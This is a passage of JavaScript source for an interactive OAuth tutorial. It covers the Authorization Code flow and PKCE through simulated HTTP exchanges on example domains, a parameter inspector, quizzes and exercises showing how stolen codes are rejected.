        if (g === '3' || g === '4') errs.push('<b>' + q[0] + '</b>: ' + G[+g] + ' is deprecated and removed in OAuth 2.1.');
        else if (g !== String(q[1])) errs.push('<b>' + q[0] + '</b>: wrong grant.');
        if (t !== q[2]) errs.push('<b>' + q[0] + '</b>: wrong client type (can this code keep a secret?).');
      });
      if (!errs.length) return feedback($('#fb'), true, '✅ All correct. Notice that Authorization Code + PKCE covers almost every app that has a user.');
      feedback($('#fb'), false, '❌ Not yet:<ul><li>' + errs.join('</li><li>') + '</li></ul>');
    };
  }

  // ───────────────────────────── 4. auth-code ─────────────────────────────
  L.push({
    id: 'auth-code',
    section: SECTION,
    title: 'Authorization Code flow',
    explain: `
      <p>The <strong>Authorization Code grant</strong> (RFC 6749 §4.1) is the main OAuth flow. Web apps, SPAs and mobile apps all
      use it (plus PKCE, covered in the next lesson). It has two halves:</p>
      <ol>
        <li><strong>Front-channel:</strong> the browser is redirected to the AS, the user logs in and consents, and the browser comes back carrying a <strong>code</strong>.</li>
        <li><strong>Back-channel:</strong> the client sends the code directly to the token endpoint, proves who it is, and receives the <strong>access token</strong>.</li>
      </ol>
      <h3>① The authorization request</h3>
      <pre><code class="language-http">GET /authorize?response_type=code
    &amp;client_id=printapp
    &amp;redirect_uri=https%3A%2F%2Fprintapp.example%2Fcallback
    &amp;scope=photos.read%20profile
    &amp;state=af0ifjsldkj HTTP/1.1
Host: accounts.megacorp.example</code></pre>
      <ul>
        <li><code>response_type=code</code>: "I want a code back".</li>
        <li><code>client_id</code>: which registered app this is.</li>
        <li><code>redirect_uri</code>: where to send the browser back. It must exactly match one registered for this client.</li>
        <li><code>scope</code>: what access is requested, as space-separated strings.</li>
        <li><code>state</code>: a random value the client stores in the user's session and checks on return. This is CSRF protection.</li>
      </ul>
      <h3>② The callback (front-channel)</h3>
      <pre><code class="language-http">HTTP/1.1 302 Found
Location: https://printapp.example/callback?code=SplxlOBeZQQYbYS6WxSbIA&amp;state=af0ifjsldkj</code></pre>
      <p>The <code>code</code> is <strong>short-lived</strong> (RFC 6749 recommends 10 minutes at most; 30–60 s is typical) and <strong>single-use</strong>.
      On its own it's useless: you also need the client's credentials (and, with PKCE, the verifier) to exchange it.</p>
      <h3>③ The token request (back-channel)</h3>
      <pre><code class="language-http">POST /token HTTP/1.1
Host: accounts.megacorp.example
Authorization: Basic cHJpbnRhcHA6czNjcjN0LXByaW50YXBw     ← base64(client_id:client_secret)
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&amp;code=SplxlOBeZQQYbYS6WxSbIA
&amp;redirect_uri=https%3A%2F%2Fprintapp.example%2Fcallback</code></pre>
      <pre><code class="language-http">HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: no-store

{ "access_token": "2YotnFZFEjr1zCsicMWpAA", "token_type": "Bearer",
  "expires_in": 3600, "refresh_token": "tGzv3JOkF0XG5Qx2TlKWIA", "scope": "photos.read profile" }</code></pre>
      <div class="tip"><strong>Why the two-step dance?</strong> Anything in the front channel can leak through history, logs, extensions or a
      malicious redirect. So only a one-time code goes there. The valuable token comes over the back channel, and only to a client
      that can authenticate.</div>
      <div class="warn">Client authentication at <code>/token</code> is usually <code>client_secret_basic</code> (HTTP Basic, shown above) or
      <code>client_secret_post</code> (<code>client_id</code> + <code>client_secret</code> in the body). Stronger options are
      <code>private_key_jwt</code> and mTLS. Public clients (SPAs, mobile) send only <code>client_id</code> and rely on PKCE.</div>
    `,
    examples: [
      {
        title: 'Full Authorization Code flow, message by message',
        code: W(`<div id="flow"></div>`, function () {
          const AS = 'https://accounts.megacorp.example', CB = 'https://printapp.example/callback';
          const state = Auth.randB64url(12), code = Auth.randB64url(16);
          const at = 'mc_at_' + Auth.randB64url(18), rt = 'mc_rt_' + Auth.randB64url(18);
          const basic = Auth.b64('printapp:s3cr3t-printapp');
          const authzQ = form({ response_type: 'code', client_id: 'printapp', redirect_uri: CB, scope: 'photos.read profile', state });
          const authzUrl = AS + '/authorize?' + authzQ;
          const cbQ = form({ code, state });
          const tokenBody = form({ grant_type: 'authorization_code', code, redirect_uri: CB });
          const tokenJson = pj({ access_token: at, token_type: 'Bearer', expires_in: 3600, refresh_token: rt, scope: 'photos.read profile' });
          const actors = [
            { id: 'u', label: 'User / Browser', icon: '🧑', store: {}, storeLabel: 'Browser (cookies, URL)' },
            { id: 'c', label: 'Client app', icon: '🖨', store: { client_id: 'printapp', client_secret: 's3cr3t-printapp' }, storeLabel: 'printapp.example server' },
            { id: 'as', label: 'Auth Server', icon: '🛂', store: { 'printapp redirect_uris': CB }, storeLabel: 'accounts.megacorp.example' },
            { id: 'api', label: 'API', icon: '🗄', store: {}, storeLabel: 'api.megacorp.example' },
          ];
          const front = [
            { from: 'u', to: 'c', label: 'click "Connect MegaCorp"', msg: 'GET /connect/megacorp HTTP/1.1\nHost: printapp.example\nCookie: app_sid=s-81fa',
              note: 'Alice is logged in to PrintApp (cookie <code>app_sid</code>) and wants to import photos.' },
            { from: 'c', to: 'u', kind: 'redirect', badge: 'front-channel', label: '302 → AS /authorize', msg: 'HTTP/1.1 302 Found\nLocation: ' + authzUrl,
              hl: ['response_type=code', 'client_id=printapp', 'state=' + state],
              set: { c: { 'session[s-81fa].state': state } },
              note: 'PrintApp generates a random <code>state</code>, saves it <b>in Alice\'s session</b>, and redirects her browser. Note the URL-encoding: <code>:</code> → <code>%3A</code>, <code>/</code> → <code>%2F</code>, space → <code>+</code>.' },
            { from: 'u', to: 'as', badge: 'front-channel', label: 'GET /authorize?…', msg: 'GET /authorize?' + authzQ + ' HTTP/1.1\nHost: accounts.megacorp.example',
              note: 'The AS checks that <code>client_id=printapp</code> exists and that <code>redirect_uri</code> <b>exactly</b> matches the registered one. If not, it shows an error page and does <b>not</b> redirect.' },
            { from: 'as', to: 'u', kind: 'res', label: 'login + consent page', msg: 'HTTP/1.1 200 OK\nContent-Type: text/html\n\n# MegaCorp sign-in: alice@megacorp.example / ********\n# "PrintApp wants to: ☑ View your photos  ☑ See your name"',
              note: 'The user authenticates <b>to the AS</b> (password, passkey, MFA…). PrintApp never sees this.' },
          ];
          const ok = front.concat([
            { from: 'u', to: 'as', label: 'POST sign-in + Allow', msg: 'POST /authorize/decision HTTP/1.1\nHost: accounts.megacorp.example\nCookie: mc_sid=Q9x...\nContent-Type: application/x-www-form-urlencoded\n\napprove=true&scope=photos.read+profile',
              set: { u: { 'cookie mc_sid': 'Q9x… (MegaCorp)' } } },
            { from: 'as', to: 'u', kind: 'redirect', badge: 'front-channel', label: '302 → callback?code&state', msg: 'HTTP/1.1 302 Found\nLocation: ' + CB + '?' + cbQ,
              hl: ['code=' + code, 'state=' + state],
              set: { as: { ['code ' + code.slice(0, 8) + '…']: 'alice, printapp, 60s, unused' } },
              note: 'The AS creates a one-time <code>code</code>, bound to Alice, <code>client_id</code> and <code>redirect_uri</code>, valid ~60 s. It echoes <code>state</code> back unchanged.' },
            { from: 'u', to: 'c', badge: 'front-channel', label: 'GET /callback?code&state', msg: 'GET /callback?' + cbQ + ' HTTP/1.1\nHost: printapp.example\nCookie: app_sid=s-81fa' },
            { from: 'c', to: 'c', label: 'state == session.state ?', set: { c: { 'session[s-81fa].state': null } },
              note: '<code>' + state + '</code> matches what we stored for <b>this</b> session, so this callback really belongs to the flow Alice started (not one an attacker injected). The state is deleted so it can\'t be reused.' },
            { from: 'c', to: 'as', kind: 'back', label: 'POST /token (code + client auth)', msg: 'POST /token HTTP/1.1\nHost: accounts.megacorp.example\nAuthorization: Basic ' + basic + '\nContent-Type: application/x-www-form-urlencoded\nAccept: application/json\n\n' + tokenBody,
              hl: ['grant_type=authorization_code', 'Authorization'],
              note: 'Back-channel: server-to-server. <code>Basic ' + basic + '</code> = base64("printapp:s3cr3t-printapp"). The same <code>redirect_uri</code> is sent again so the AS can confirm it matches.' },
            { from: 'as', to: 'as', label: 'check client, code, redirect_uri', set: { as: { ['code ' + code.slice(0, 8) + '…']: 'USED' } },
              note: 'The AS verifies: client secret correct, code exists, not expired, not used before, issued to <b>this</b> client, same <code>redirect_uri</code>. Then it marks the code used.' },
            { from: 'as', to: 'c', kind: 'back', label: '200 {access_token, refresh_token…}', msg: 'HTTP/1.1 200 OK\nContent-Type: application/json\nCache-Control: no-store\n\n' + tokenJson,
              set: { c: { access_token: at.slice(0, 14) + '… (1h)', refresh_token: rt.slice(0, 14) + '…' } },
              note: '<code>Cache-Control: no-store</code> keeps proxies from caching tokens. <code>scope</code> tells the client what was <b>actually</b> granted (it may be less than requested).' },
            { from: 'c', to: 'api', label: 'GET /v1/photos  Bearer', msg: 'GET /v1/photos HTTP/1.1\nHost: api.megacorp.example\nAuthorization: Bearer ' + at, hl: ['Bearer ' + at] },
            { from: 'api', to: 'c', kind: 'res', label: '200 photos', msg: 'HTTP/1.1 200 OK\nContent-Type: application/json\n\n[{"id":"p1","title":"Beach"},{"id":"p2","title":"Hike"}]',
              note: 'Done. The access token never passed through the browser.' },
          ]);
          const deny = front.concat([
            { from: 'u', to: 'as', label: 'POST Deny', msg: 'POST /authorize/decision HTTP/1.1\nHost: accounts.megacorp.example\nContent-Type: application/x-www-form-urlencoded\n\napprove=false' },
            { from: 'as', to: 'u', kind: 'redirect', label: '302 → callback?error=access_denied', msg: 'HTTP/1.1 302 Found\nLocation: ' + CB + '?' + form({ error: 'access_denied', error_description: 'The user denied the request', state }),
              hl: ['error=access_denied'], note: 'Errors also come back to the <code>redirect_uri</code>, as <code>error</code> (+ optional <code>error_description</code>) along with <code>state</code>.' },
            { from: 'u', to: 'c', label: 'GET /callback?error=…', msg: 'GET /callback?' + form({ error: 'access_denied', error_description: 'The user denied the request', state }) + ' HTTP/1.1\nHost: printapp.example' },
            { from: 'c', to: 'u', kind: 'res', label: '200 "No problem, import cancelled"', msg: 'HTTP/1.1 200 OK\nContent-Type: text/html\n\n<p>You chose not to connect MegaCorp.</p>',
              note: 'A good client handles <code>access_denied</code> gracefully. It\'s a normal outcome, not a crash.' },
          ]);
          const bad = [
            { from: 'c', to: 'as', kind: 'back', label: 'POST /token (code already used)', msg: 'POST /token HTTP/1.1\nHost: accounts.megacorp.example\nAuthorization: Basic ' + basic + '\nContent-Type: application/x-www-form-urlencoded\n\n' + tokenBody,
              note: 'Someone (a bug, a retry, or an attacker who saw the code) sends the <b>same code</b> a second time.' },
            { from: 'as', to: 'c', kind: 'err', label: '400 invalid_grant', msg: 'HTTP/1.1 400 Bad Request\nContent-Type: application/json\nCache-Control: no-store\n\n{"error":"invalid_grant","error_description":"authorization code already used"}',
              hl: ['invalid_grant'], note: '<code>invalid_grant</code>: the code is used, expired, issued to another client, or the <code>redirect_uri</code> differs. The AS <i>should</i> also revoke tokens already issued from this code (RFC 6749 §4.1.2).' },
            { from: 'c', to: 'as', kind: 'back', label: 'POST /token (wrong client_secret)', msg: 'POST /token HTTP/1.1\nHost: accounts.megacorp.example\nAuthorization: Basic ' + Auth.b64('printapp:guess') + '\nContent-Type: application/x-www-form-urlencoded\n\n' + tokenBody },
            { from: 'as', to: 'c', kind: 'err', label: '401 invalid_client', msg: 'HTTP/1.1 401 Unauthorized\nWWW-Authenticate: Basic realm="token"\nContent-Type: application/json\n\n{"error":"invalid_client"}',
              hl: ['invalid_client'], note: '<code>invalid_client</code>: client authentication failed. That\'s why a stolen code alone isn\'t enough for a confidential client.' },
          ];
          Seq.mount('#flow', {
            title: 'Authorization Code grant (RFC 6749 §4.1), all values generated live',
            actors,
            scenarios: [{ name: '✅ Happy path', steps: ok }, { name: '🚫 User clicks Deny', steps: deny }, { name: '❌ Token endpoint errors', steps: bad }],
          });
        }),
        explain: `
          <details>
            <summary>The problem: how do you get a token to the app without exposing it?</summary>
            <p>The AS must talk to the user through the <strong>browser</strong> (login, consent), but browsers are leaky: URLs end up in history,
            server logs and <code>Referer</code> headers, and extensions can read them. If the AS put the <em>access token</em> in the redirect URL,
            it would leak (that was the Implicit flow, now removed). So the redirect carries only a short-lived, single-use <strong>code</strong>,
            and the client swaps it for tokens over a direct HTTPS call where it also proves its identity.</p>
          </details>
          <details>
            <summary>Step by step (✅ Happy path tab)</summary>
            <table>
              <tr><th>#</th><th>Channel</th><th>What travels</th><th>State change</th></tr>
              <tr><td>1</td><td>browser → client</td><td>"Connect MegaCorp" click</td><td>-</td></tr>
              <tr><td>2</td><td>front (302)</td><td><code>/authorize?response_type=code&amp;client_id&amp;redirect_uri&amp;scope&amp;state</code></td><td>client session gets <code>state</code></td></tr>
              <tr><td>3–4</td><td>front</td><td>AS validates client_id + exact redirect_uri, shows login + consent</td><td>-</td></tr>
              <tr><td>5</td><td>browser → AS</td><td>sign-in + Allow</td><td>browser gets <code>mc_sid</code> cookie</td></tr>
              <tr><td>6–7</td><td>front (302)</td><td><code>callback?code=…&amp;state=…</code></td><td>AS stores code: <code>unused, 60s</code></td></tr>
              <tr><td>8</td><td>client internal</td><td>compare <code>state</code> with session</td><td>state deleted</td></tr>
              <tr><td>9</td><td><b>back</b></td><td><code>POST /token</code> with Basic client auth + code + redirect_uri</td><td>-</td></tr>
              <tr><td>10</td><td>AS internal</td><td>verify client, code, redirect_uri</td><td>code → <code>USED</code></td></tr>
              <tr><td>11</td><td><b>back</b></td><td>JSON <code>access_token, token_type, expires_in, refresh_token, scope</code></td><td>client stores tokens</td></tr>
              <tr><td>12–13</td><td>direct</td><td><code>Authorization: Bearer …</code> → 200</td><td>-</td></tr>
            </table>
          </details>
          <details>
            <summary>Key ideas</summary>
            <ul>
              <li><strong>Steps 2–7 happen in the URL bar</strong>, so nothing secret goes there. <code>state</code> and <code>code</code> are random and one-time.</li>
              <li><strong><code>state</code></strong> ties the callback to the browser session that started the flow (see the attacks lesson for what happens without it).</li>
              <li><strong>The code is bound</strong> to the client and the redirect_uri. Using it twice or from another client gives <code>invalid_grant</code>.</li>
              <li><strong>Errors have two shapes</strong>: at <code>/authorize</code> they come back as <code>?error=…</code> on the redirect (e.g. <code>access_denied</code>). At <code>/token</code> they are a JSON body with 400/401 (<code>invalid_grant</code>, <code>invalid_client</code>).</li>
            </ul>
          </details>
          <details>
            <summary>Try this</summary>
            <ul>
              <li>In the happy path, click step 2 and step 6: the same <code>state</code> value is highlighted in both.</li>
              <li>Watch the Auth Server card: the code goes <code>unused</code> → <code>USED</code> at step 10. Then open the <b>❌ Token endpoint errors</b> tab to see a reuse attempt fail.</li>
              <li>Press ↺ Reset: all values (<code>state</code>, <code>code</code>, tokens) are regenerated randomly.</li>
              <li>Open <b>🚫 User clicks Deny</b>: errors use the same <code>redirect_uri</code> and still carry <code>state</code>.</li>
            </ul>
          </details>
        `,
      },
      {
        title: 'URL & body inspector: decode any OAuth message',
        code: W(`
<div class="card">
  <div class="row" style="margin-bottom:6px">
    <b>Load:</b>
    <button data-s="0">/authorize URL</button><button data-s="1">callback (success)</button>
    <button data-s="2">callback (error)</button><button data-s="3">/token body</button>
  </div>
  <textarea id="in" rows="3"></textarea>
  <p class="muted" style="margin:4px 0 0">Paste or edit any URL or form body. Every parameter is decoded and explained below.</p>
</div>
<table class="t" id="out"></table>
`, function () {
          const S = [
            'https://accounts.megacorp.example/authorize?response_type=code&client_id=printapp&redirect_uri=https%3A%2F%2Fprintapp.example%2Fcallback&scope=photos.read%20profile&state=af0ifjsldkj',
            'https://printapp.example/callback?code=SplxlOBeZQQYbYS6WxSbIA&state=af0ifjsldkj',
            'https://printapp.example/callback?error=access_denied&error_description=The+user+denied+the+request&state=af0ifjsldkj',
            'grant_type=authorization_code&code=SplxlOBeZQQYbYS6WxSbIA&redirect_uri=https%3A%2F%2Fprintapp.example%2Fcallback',
          ];
          const M = {
            response_type: 'Which flow: <code>code</code> = Authorization Code. (<code>token</code> = the deprecated Implicit flow.)',
            client_id: 'Public identifier of the registered app. Not a secret.',
            redirect_uri: 'Where the AS sends the browser back. Must <b>exactly</b> match a registered value.',
            scope: 'Space-separated permissions requested (space is encoded as <code>%20</code> or <code>+</code>).',
            state: 'Random, unguessable value stored in the user\'s session; the client checks it on return (CSRF protection).',
            code: 'One-time authorization code: short-lived (≤10 min, usually ~1 min) and bound to client_id + redirect_uri.',
            error: 'Error code from RFC 6749 §4.1.2.1: <code>access_denied</code>, <code>invalid_request</code>, <code>invalid_scope</code>, <code>unauthorized_client</code>, <code>server_error</code>…',
            error_description: 'Human-readable text for developers. Don\'t show it raw to users, and never trust it as HTML.',
            grant_type: 'At /token: which grant is being redeemed (<code>authorization_code</code>, <code>refresh_token</code>, <code>client_credentials</code>…).',
            code_challenge: 'PKCE: BASE64URL(SHA256(code_verifier)), see the PKCE lesson.',
            code_challenge_method: 'PKCE: <code>S256</code> (always use it) or <code>plain</code>.',
            code_verifier: 'PKCE: the secret random string whose hash was sent earlier.',
            nonce: 'OpenID Connect: binds the ID token to this request.',
          };
          function render() {
            const raw = $('#in').value.trim();
            let where = '', q = raw;
            const i = raw.indexOf('?');
            if (/^https?:/.test(raw)) { where = i < 0 ? raw : raw.slice(0, i); q = i < 0 ? '' : raw.slice(i + 1); }
            const rows = [];
            if (where) rows.push('<tr><th>endpoint</th><td colspan="3"><code>' + esc(where) + '</code></td></tr>');
            q.split('&').filter(Boolean).forEach((kv) => {
              const j = kv.indexOf('='), k = decodeURIComponent(j < 0 ? kv : kv.slice(0, j));
              const rawv = j < 0 ? '' : kv.slice(j + 1);
              let dv; try { dv = decodeURIComponent(rawv.replace(/\+/g, ' ')); } catch (e) { dv = '⚠ bad encoding'; }
              rows.push('<tr><td><code>' + esc(k) + '</code></td><td class="mono">' + esc(rawv) + '</td><td class="mono"><b>' + esc(dv) +
                '</b></td><td>' + (M[k] || '<span class="muted">(not a standard OAuth parameter)</span>') + '</td></tr>');
            });
            $('#out').innerHTML = '<tr><th>param</th><th>as sent (encoded)</th><th>decoded</th><th>meaning</th></tr>' + rows.join('');
          }
          $$('[data-s]').forEach((b) => (b.onclick = () => { $('#in').value = S[+b.dataset.s]; render(); }));
          $('#in').oninput = render;
          $('#in').value = S[0];
          render();
        }),
      },
    ],
    quiz: [
      { q: 'Why does the AS redirect back with a <code>code</code> instead of the access token itself?',
        options: ['Codes are shorter, so URLs fit', 'The redirect goes through the browser (front-channel) where it can leak; the code alone is useless without client authentication',
          'Access tokens can\'t be URL-encoded', 'To save one HTTP request'],
        answer: 1, why: 'Front-channel URLs leak via history, logs and extensions. A one-time code that only the authenticated client (or PKCE holder) can redeem keeps the real token on the back channel.' },
      { q: 'What does the client do with <code>state</code> when the callback arrives?',
        options: ['Sends it to the API', 'Compares it to the value saved in this user\'s session and rejects the callback if it differs',
          'Uses it as the access token', 'Nothing, it is for the AS only'],
        answer: 1, why: 'state binds the callback to the browser session that started the flow, which blocks CSRF / login-injection attacks.' },
      { q: 'The client sends the same code to <code>/token</code> twice. The second response is…',
        options: ['200 with the same token', '400 {"error":"invalid_grant"}', '302 back to /authorize', '403 insufficient_scope'],
        answer: 1, why: 'Codes are single-use. Reuse gives invalid_grant, and the AS should revoke tokens already issued from that code.' },
      { q: 'Which parameter is sent in <strong>both</strong> the /authorize request and the /token request in RFC 6749?',
        options: ['state', 'scope', 'redirect_uri (when it was included in /authorize)', 'client_secret'],
        answer: 2, why: 'RFC 6749 §4.1.3: if redirect_uri was in the authorization request, the token request must include the identical value.' },
      { q: 'Which response header must the token endpoint include?',
        options: ['Cache-Control: no-store', 'Set-Cookie', 'Location', 'WWW-Authenticate: Bearer'],
        answer: 0, why: 'Responses containing tokens must not be cached by browsers or proxies (RFC 6749 §5.1).' },
    ],
    exercise: {
      task: `<p>Build the authorization request URL. The requirements are listed in the box below. Type the full URL, then click <strong>Check</strong>.</p>`,
      hint: 'Start with https://accounts.megacorp.example/authorize? then add response_type=code&client_id=…&redirect_uri=(encoded)&scope=photos.read%20profile&state=(random). Use the 🎲 button for a state value.',
      starter: W(`<div id="ex"></div>`, exAuthorize, '', { fill: false }),
      solution: W(`<div id="ex"></div>`, exAuthorize, '', { fill: true }),
    },
  });

  function exAuthorize() {
    const EP = 'https://accounts.megacorp.example/authorize', CB = 'https://printapp.example/callback';
    $('#ex').innerHTML = '<div class="card"><b>Requirements</b><table class="t" style="margin-top:4px">' +
      '<tr><td>Authorization endpoint</td><td><code>' + EP + '</code></td></tr>' +
      '<tr><td>Flow</td><td>Authorization Code</td></tr><tr><td>client_id</td><td><code>printapp</code></td></tr>' +
      '<tr><td>redirect_uri (registered)</td><td><code>' + CB + '</code></td></tr>' +
      '<tr><td>Scopes</td><td><code>photos.read</code> and <code>profile</code>, nothing else</td></tr>' +
      '<tr><td>state</td><td>random, at least 16 characters</td></tr></table></div>' +
      '<div class="row"><b>Your URL</b> <button id="rnd">🎲 random state</button> <span id="st" class="mono muted"></span></div>' +
      '<textarea id="u" rows="3"></textarea><button class="primary" id="chk">Check</button><div class="fb" id="fb"></div>';
    $('#rnd').onclick = () => ($('#st').textContent = Auth.randB64url(16));
    if (DATA.fill) $('#u').value = EP + '?' + form({ response_type: 'code', client_id: 'printapp', redirect_uri: CB, scope: 'photos.read profile', state: 'k3Jd9_xQ2pLm0vWz8aRt' });
    $('#chk').onclick = () => {
      const raw = $('#u').value.trim();
      const errs = [], tips = [];
      let u;
      try { u = new URL(raw); } catch (e) { return feedback($('#fb'), false, '❌ That is not a valid absolute URL yet. Start with <code>' + EP + '?</code>'); }
      if (u.origin + u.pathname !== EP) errs.push('Endpoint should be <code>' + EP + '</code>.');
      const p = u.searchParams;
      if (p.get('response_type') !== 'code') errs.push('<code>response_type</code> must be <code>code</code>.');
      if (p.get('client_id') !== 'printapp') errs.push('<code>client_id</code> must be <code>printapp</code>.');
      if (p.get('redirect_uri') !== CB) errs.push('<code>redirect_uri</code> must decode to exactly <code>' + CB + '</code> (no trailing slash, same path).');
      const sc = (p.get('scope') || '').split(' ').filter(Boolean).sort().join(' ');
      if (sc !== 'photos.read profile') errs.push('<code>scope</code> must be exactly <code>photos.read</code> and <code>profile</code>, space-separated (encoded <code>%20</code> or <code>+</code>).');
      if ((p.get('state') || '').length < 16) errs.push('<code>state</code> missing or shorter than 16 characters.');
      if (/ /.test(raw)) errs.push('URLs can\'t contain raw spaces: encode them.');
      if (/redirect_uri=https:\/\//.test(raw)) tips.push('Tip: percent-encode the redirect_uri value (<code>https%3A%2F%2F…</code>). Many servers accept it raw, but encoding avoids <code>&amp;</code>/<code>?</code> surprises.');
      if (/client_secret/.test(raw)) errs.push('Never put <code>client_secret</code> in a front-channel URL!');
      if (errs.length) return feedback($('#fb'), false, '❌ Not yet:<ul><li>' + errs.join('</li><li>') + '</li></ul>' + tips.join('<br>'));
      feedback($('#fb'), true, '✅ Valid authorization request. The AS would show the login + consent page and later redirect to <code>' + CB + '?code=…&amp;state=' + esc(p.get('state')) + '</code>.' + (tips.length ? '<br>' + tips.join('<br>') : ''));
    };
  }

  // ───────────────────────────── 5. pkce ─────────────────────────────
  L.push({
    id: 'pkce',
    section: SECTION,
    title: 'PKCE',
    explain: `
      <p><strong>PKCE</strong> ("pixy", <em>Proof Key for Code Exchange</em>, <strong>RFC 7636</strong>) fixes a hole in the
      Authorization Code flow for <strong>public clients</strong>: mobile, desktop and single-page apps that can't keep a client secret.</p>
      <h3>The problem</h3>
      <p>A mobile app usually gets its callback through a custom URL scheme such as <code>com.printapp:/cb?code=…</code>. Any other app on the phone
      can register the <em>same</em> scheme. If a malicious app receives the redirect, it has the code. Since a public client has no secret,
      the code is all you need to call <code>/token</code>, so the thief gets the tokens.</p>
      <h3>The fix: a one-time secret made fresh for each login</h3>
      <ol>
        <li>Before redirecting, the app creates a random <strong><code>code_verifier</code></strong>: 43–128 characters from <code>A–Z a–z 0–9 - . _ ~</code> (32 random bytes, base64url-encoded, gives 43). It keeps this to itself.</li>
        <li>It sends only the hash in the authorization request: <strong><code>code_challenge = BASE64URL(SHA256(code_verifier))</code></strong> with <code>code_challenge_method=S256</code>. The AS stores the challenge with the code.</li>
        <li>At <code>/token</code> the app sends the original <code>code_verifier</code>. The AS hashes it and compares it with the stored challenge. If they don't match, the response is <code>400 invalid_grant</code>.</li>
      </ol>
      <pre><code class="language-http">GET /authorize?response_type=code&amp;client_id=printapp-ios
    &amp;redirect_uri=com.printapp%3A%2Fcb&amp;scope=photos.read&amp;state=xyz
    &amp;code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM
    &amp;code_challenge_method=S256

POST /token
grant_type=authorization_code&amp;code=…&amp;client_id=printapp-ios
&amp;redirect_uri=com.printapp%3A%2Fcb
&amp;code_verifier=dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk</code></pre>
      <p>A thief who steals the code saw only the <em>hash</em> (in the front-channel URL), and SHA-256 can't be reversed. So it can't
      produce the verifier.</p>
      <div class="tip"><strong>Analogy:</strong> a coat check where you tear a ticket in half. You leave one half (the challenge) with the coat
      and keep the other half (the verifier). Only the person holding the matching half gets the coat back, even if someone else learned the coat number (the code).</div>
      <h3>PKCE for everyone (2026 best practice)</h3>
      <p><strong>RFC 9700</strong> (OAuth 2.0 Security BCP, January 2025) says public clients <strong>MUST</strong> use PKCE, it is
      RECOMMENDED for confidential clients too, and authorization servers MUST support it. PKCE also stops <strong>code injection</strong>
      (an attacker pastes a stolen code into their own session), which a client secret can't prevent. The <strong>OAuth 2.1</strong> draft
      makes PKCE part of the Authorization Code flow itself.</p>
      <div class="warn">Always use <code>S256</code>. The <code>plain</code> method (challenge = verifier) gives no protection if the
      authorization request leaks. It exists only for devices that can't compute SHA-256.</div>
    `,
    examples: [
      {
        title: 'PKCE lab: generate, hash, verify (real SHA-256)',
        code: W(`
<div class="card">
  <h4>① App: create a code_verifier (kept secret)</h4>
  <div class="row"><button class="primary" id="gen">🎲 Generate (32 random bytes → base64url)</button><button id="rfc">Use RFC 7636 example</button></div>
  <input id="ver" class="w mono" style="margin-top:4px">
  <div id="verInfo" class="muted"></div>
</div>
<div class="card">
  <h4>② App: code_challenge = BASE64URL(SHA256(verifier))</h4>
  <table class="t mono"><tr><td style="width:150px">SHA-256 (hex)</td><td id="hex"></td></tr>
  <tr><td>base64url, no "="</td><td id="ch" style="font-weight:700;color:#087ea4"></td></tr></table>
  <pre class="box" id="authz"></pre>
</div>
<div class="card">
  <h4>③ Later, at /token: which verifier arrives?</h4>
  <div class="row">
    <label><input type="radio" name="who" value="app" checked> 📱 the real app sends its verifier</label>
    <label><input type="radio" name="who" value="none"> 😈 thief sends no verifier</label>
    <label><input type="radio" name="who" value="guess"> 😈 thief guesses one</label>
    <label><input type="radio" name="who" value="chal"> 😈 thief sends the challenge it saw in the URL</label>
  </div>
  <pre class="box" id="tok"></pre>
  <div id="verdict" style="margin-top:6px"></div>
</div>
`, function () {
          const RFC = 'dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk';
          let guess = Auth.randB64url(32);
          function render() {
            const v = $('#ver').value;
            const valid = /^[A-Za-z0-9\-._~]{43,128}$/.test(v);
            $('#verInfo').innerHTML = 'length ' + v.length + ' · ' + (valid ? '<span class="ok">valid (43–128 unreserved chars)</span>'
              : '<span class="bad">invalid: must be 43–128 chars of A–Z a–z 0–9 - . _ ~</span>');
            const ch = Auth.sha256b64url(v);
            $('#hex').textContent = Auth.sha256hex(v);
            $('#ch').textContent = ch;
            $('#authz').innerHTML = httpHtml('GET /authorize?' + form({ response_type: 'code', client_id: 'printapp-ios', redirect_uri: 'com.printapp:/cb',
              scope: 'photos.read', state: 'xyz', code_challenge: ch, code_challenge_method: 'S256' }) + ' HTTP/1.1\nHost: accounts.megacorp.example\n\n# AS stores with the code: code_challenge=' + ch + ', method=S256',
              ['code_challenge=' + ch]);
            const who = document.querySelector('input[name=who]:checked').value;
            const sent = who === 'app' ? v : who === 'guess' ? guess : who === 'chal' ? ch : null;
            const body = { grant_type: 'authorization_code', code: 'SplxlOBeZQQYbYS6WxSbIA', client_id: 'printapp-ios', redirect_uri: 'com.printapp:/cb' };
            if (sent !== null) body.code_verifier = sent;
            $('#tok').innerHTML = httpHtml('POST /token HTTP/1.1\nHost: accounts.megacorp.example\nContent-Type: application/x-www-form-urlencoded\n\n' + form(body),
              sent ? ['code_verifier=' + sent] : []);
            let html;
            if (sent === null) html = '<span class="pill r">400 invalid_grant</span> AS: this code was issued with a code_challenge, so a code_verifier is required.';
            else {
              const h = Auth.sha256b64url(sent);
              const ok = h === ch && valid;
              html = '<div class="mono">AS computes BASE64URL(SHA256(received)) = <b>' + esc(h) + '</b><br>stored code_challenge &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= <b>' + esc(ch) + '</b></div>' +
                (ok ? '<span class="pill g">200 OK: tokens issued</span>' : '<span class="pill r">400 {"error":"invalid_grant"}</span> hashes differ' +
                  (who === 'chal' ? ' (hashing the challenge gives a different value: the hash is one-way)' : ''));
            }
            $('#verdict').innerHTML = html;
          }
          $('#gen').onclick = () => { $('#ver').value = Auth.randB64url(32); guess = Auth.randB64url(32); render(); };
          $('#rfc').onclick = () => { $('#ver').value = RFC; render(); };
          $('#ver').oninput = render;
          $$('input[name=who]').forEach((r) => (r.onchange = render));
          $('#ver').value = Auth.randB64url(32);
          render();
        }),
        explain: `
          <details>
            <summary>Step by step through the three cards</summary>
            <table>
              <tr><th>Card</th><th>Who</th><th>Value</th><th>Visible to an attacker?</th></tr>
              <tr><td>①</td><td>App (memory only)</td><td><code>code_verifier</code>: 43 chars from 32 random bytes</td><td>No, never leaves the app until step ③</td></tr>
              <tr><td>②</td><td>App → browser → AS</td><td><code>code_challenge</code> + <code>code_challenge_method=S256</code> in the URL</td><td>Yes (front-channel), but it's a one-way hash</td></tr>
